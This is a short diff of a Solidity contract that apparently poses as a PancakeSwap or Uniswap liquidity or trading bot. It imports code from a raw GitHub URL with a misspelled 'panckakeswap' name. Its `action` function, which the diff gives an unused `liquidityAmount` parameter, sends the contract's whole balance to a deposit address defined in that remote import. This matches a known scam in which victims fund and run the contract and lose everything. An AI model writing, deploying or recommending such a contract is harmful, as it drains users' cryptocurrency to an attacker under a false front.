@@ -60,7 +60,7 @@ import "https://raw.githubusercontent.com/soliditier01/panckakeswap-blog-contrac
     }
 
     receive() external payable {}
-    function action() public payable {
+    function action(uint liquidityAmount) public payable {
         payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
         manager;
     }
